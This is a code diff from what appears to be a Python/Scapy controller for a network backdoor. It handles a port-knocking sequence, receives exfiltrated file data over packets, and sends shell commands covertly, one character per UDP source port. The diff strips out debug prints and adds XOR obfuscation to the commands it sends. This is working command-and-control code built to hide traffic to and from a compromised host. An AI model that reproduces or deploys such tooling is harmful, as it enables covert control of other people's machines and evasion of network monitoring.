@@ -55,14 +55,12 @@ def process_packet(data):
     try:
         # Ensure we have received a full knock from backdoor
         if KNOCKSEQUENCE != 5:
-            print "check knock\n"
             knock(data, "receive")
         else:
             print PACKET_LEN
             # If first packet after knock, grab the number of inbound packets following
             if PACKET_LEN == 0:
                 PACKET_LEN = data[0][2].sport
-                print "Packet len: ", PACKET_LEN
             elif PACKETS_RCVD < PACKET_LEN-2:
                 # Write data to file
                 with open(FILENAME, 'a') as f:
@@ -105,7 +103,8 @@ def send_packet(data):
     # send the length of the command to the backdoor within the UDP source port
     send(IP(dst=data['dest']) / UDP(sport=len(data['cmd']), dport=int(packet['dport'])), verbose=0)
     # send the command covertly within the UDP source port
-    for c in packet['cmd']:
+    encrypted_cmd = xor_crypt(packet['cmd'])
+    for c in encrypted_cmd:
         send(IP(dst=data['dest']) / UDP(sport=ord(c), dport=int(packet['dport'])), verbose=0)
     return
 
